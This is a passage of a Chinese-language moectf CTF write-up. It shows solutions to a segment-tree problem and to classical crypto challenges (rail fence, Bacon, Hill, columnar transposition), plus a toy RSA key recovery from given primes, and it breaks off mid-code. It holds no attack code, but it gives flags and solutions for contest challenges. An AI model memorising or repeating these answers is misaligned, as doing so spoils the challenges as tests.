</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">push_up</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">update</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">,</span> <span class="kt">int</span> <span class="n">q</span><span class="p">,</span> <span class="n">LL</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">l</span> <span class="o">==</span> <span class="n">q</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">sum</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">q</span> <span class="o">&lt;=</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">update</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="n">update</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">push_up</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">node</span> <span class="nf">query</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="kt">int</span> <span class="n">r</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ql</span><span class="p">,</span> <span class="kt">int</span> <span class="n">qr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ql</span> <span class="o">&lt;=</span> <span class="n">l</span> <span class="o">&amp;&amp;</span> <span class="n">r</span> <span class="o">&lt;=</span> <span class="n">qr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">qr</span> <span class="o">&lt;=</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ql</span> <span class="o">&gt;</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">node</span> <span class="n">left</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">),</span> <span class="n">right</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">),</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">maxl</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxv</span><span class="p">,</span> <span class="n">right</span><span class="p">.</span><span class="n">maxv</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxl</span><span class="p">,</span> <span class="n">left</span><span class="p">.</span><span class="n">sum</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">maxl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">right</span><span class="p">.</span><span class="n">maxr</span><span class="p">,</span> <span class="n">left</span><span class="p">.</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">sum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">N</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">M</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%lld&#34;</span><span class="p">,</span> <span class="n">tmp</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ii</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LL</span> <span class="n">ll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">M</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ii</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ii</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">jj</span> <span class="o">&gt;</span> <span class="n">kk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">swap</span><span class="p">(</span><span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%lld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">query</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">).</span><span class="n">maxv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%lld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ll</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">update</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">ll</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="pigpen-cipher">Pigpen Cipher</h3>
<p>这个是猪圈密码, 从必应上可以搜到猪圈密码的密码表, 对着破解就可以了.</p>
<h3 id="rail-fence-cipher">Rail fence cipher</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}ofEi3_hl_d_sar0pe{_Lncesk_cslyghctr_c12_i0li_pry
</span></span></code></pre></div><p>栅栏密码, 必应了解了一下, 发现分组, 然后就找了一下o, 通过o的判断发现分组的奥妙:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}
</span></span><span class="line"><span class="cl">ofEi3_hl_d_sar0p
</span></span><span class="line"><span class="cl">e{_Lncesk_cslygh
</span></span><span class="line"><span class="cl">ctr_c12_i0li_pry
</span></span></code></pre></div><p>然后竖着读就可以找到<code>flag</code>啦. <code>flag</code>: <code>moectf{thE_rAiL_f3nc2_c1phe2_ls_a_kind_0f_cl@ssical_crypt0graphy}</code></p>
<h3 id="bacons-cipher">Bacon’s Cipher</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">AqCEclcIZQjbecyOhgXSwOdveKjpYyaeknUkyokazpyUnhFDSmvQEvCdmoFsfAvfyvTQFWkyBNIojUddNbtmT
</span></span></code></pre></div><p>这道题居然是以大小写来隐藏信息的!!!</p>
<p>然后就有了下面这个程序:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>运行一下, 得到了一串二进制: <code>0100111000111110110010111011011111011111111011000110010111011011110000110001101101110</code></p>
<p>手动分割一下:</p>
<p><code>01001 11000 11111 01100 10111 01101 11110 11111 11101 10001 10010 11101 10111 10000 11000 11011 01110</code></p>
<p>发现解密的不对! <code>11111</code>太夸张了&hellip;然后改一下代码,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>再运行, 得到了另一串二进制 ( 其实就是上面的结果的按位非运算 )</p>
<p><code>10110 00111 00000 10011 01000 10010 00001 00000 00010 01110 01101 00010 01000 01111 00111 00100 10001</code>, 对着字母序号表解出<code>flag</code>.</p>
<h3 id="frequency-analysis">Frequency analysis?</h3>
<p>一看题目, 频率分析啊&hellip; 我不能当工具人! 于是写一程序:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;map&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;algorithm&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;.</span><span class="se">\\</span><span class="s">chars.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;.</span><span class="se">\\</span><span class="s">frequentre.txt&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">sign</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">types</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">types</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">==</span><span class="n">string</span><span class="o">::</span><span class="n">npos</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">types</span> <span class="o">+=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">sign</span><span class="p">[</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">sort</span><span class="p">(</span><span class="n">types</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">types</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">total</span> <span class="o">=</span> <span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">frequent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">types</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">frequent</span> <span class="o">=</span> <span class="kt">double</span><span class="p">(</span><span class="n">sign</span><span class="p">[</span><span class="n">types</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span> <span class="o">/</span> <span class="n">total</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">types</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">frequent</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;%</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>然后打开结果的文件, 再复制拖到<code>Excel</code>里面, 然后根据频率大小排序, 然后从上往下读就得到<code>flag</code>了&hellip;</p>
<h3 id="md5">MD5</h3>
<p>必应, 找一网站, 复制粘贴, 查询之, 得<code>flag</code>.</p>
<h3 id="columnar-transposition">Columnar Transposition</h3>
<blockquote>
<p>维基百科对列移位密码的解释如下:</p>
<h3 id="columnar-transposition-1">Columnar transposition</h3>
<p>In a columnar transposition, the message is written out in rows of a fixed length, and then read out again column by column, and the columns are chosen in some scrambled order. Both the width of the rows and the permutation of the columns are usually defined by a keyword. For example, the keyword <code>ZEBRAS</code> is of length 6 (so the rows are of length 6), and the permutation is defined by the alphabetical order of the letters in the keyword. In this case, the order would be &ldquo;6 3 2 4 1 5&rdquo;.</p>
<p>In a regular columnar transposition cipher, any spare spaces are filled with nulls; in an irregular columnar transposition cipher, the spaces are left blank. Finally, the message is read off in columns, in the order specified by the keyword. For example, suppose we use the keyword <code>ZEBRAS</code> and the message <code>WE ARE DISCOVERED. FLEE AT ONCE</code>. In a regular columnar transposition, we write this into the grid as follows:</p>
<pre tabindex="0"><code>6 3 2 4 1 5
W E A R E D
I S C O V E
R E D F L E
E A T O N C
E Q K J E U
</code></pre><p>providing five nulls (<code>QKJEU</code>), these letters can be randomly selected as they just fill out the incomplete columns and are not part of the message. The ciphertext is then read off as:</p>
<pre tabindex="0"><code>EVLNE ACDTK ESEAQ ROFOJ DEECU WIREE
</code></pre><p>In the irregular case, the columns are not completed by nulls:</p>
<pre tabindex="0"><code>6 3 2 4 1 5
W E A R E D
I S C O V E
R E D F L E
E A T O N C
E
</code></pre><p>This results in the following ciphertext:</p>
<pre tabindex="0"><code>EVLNA CDTES EAROF ODEEC WIREE
</code></pre><p>To decipher it, the recipient has to work out the column lengths by dividing the message length by the key length. Then he can write the message out in columns again, then re-order the columns by reforming the key word.</p>
<p>In a variation, the message is blocked into segments that are the key length long and to each segment the same permutation (given by the key) is applied. This is equivalent to a columnar transposition where the read-out is by rows instead of columns.</p>
<p>Columnar transposition continued to be used for serious purposes as a component of more complex ciphers at least into the 1950s.</p>
</blockquote>
<p>不过这题有很大的坑&hellip; 就是解密顺序和加密是反着来的.. 我之前搞了好久都搞不出来&hellip; 按照Wiki分组重排, 成功拿到<code>flag</code>.</p>
<h3 id="easy-rsa">Easy RSA</h3>
<p>这道题我研究了好久&hellip; 最后在线分解大数找到p和q, 然后bing搜来的脚本修改一下跑一遍就过了&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">=</span><span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">=</span><span class="mi">296173636181072725338746212384476813557</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">q</span><span class="o">=</span><span class="mi">336771668019607304680919844592337860739</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">e</span><span class="o">=</span><span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">n</span><span class="o">=</span><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">*</span><span class="n">arsa</span><span class="o">.</span><span class="n">q</span>
</span></span><span class="line"><span class="cl"><span class="n">Fn</span><span class="o">=</span><span class="n">long</span><span class="p">((</span><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">arsa</span><span class="o">.</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">Fn</span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">x</span><span class="o">%</span><span class="n">arsa</span><span class="o">.</span><span class="n">e</span><span class="o">==</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">           <span class="n">arsa</span><span class="o">.</span><span class="n">d</span><span class="o">=</span><span class="n">x</span><span class="o">/</span><span class="n">arsa</span><span class="o">.</span><span class="n">e</span>
</span></span><span class="line"><span class="cl">           <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;private.pem&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">arsa</span><span class="o">.</span><span class="n">exportKey</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>拿到私钥之后, 随便用个什么方法, openssl也好, 在线解密也好, 反正就出来了.</p>
<h3 id="hill-cipher">Hill Cipher</h3>
<p>这题我真的是写到地老天荒&hellip;</p>
<p>拿到题之后先找了无数个网站发现解不了, 就自己研究了一下, 发现矩阵求逆然后和密文求点积, 于是我就打开微软的<code>Mathematics</code>算了一年得到了输出, 然后写一程序手动输入弄出<code>flag</code>&hellip;</p>
<p>具体情况呢, 就是题目给了个矩阵密钥, 先求逆, 然后存下来和分好组的密文挨个求点积, 最后输出结果时, 把小数部分直接舍掉就行了, 然后输入下面的程序里开始查表.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">table</span> <span class="o">=</span> <span class="s">&#34;abijklQRSTUVWXmnop@#$%wxyzABCDcdefghEFGHI&amp;*()_+JKLMNOPYZ01234qrstuv56789!^-=&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">double</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">%=</span> <span class="n">table</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
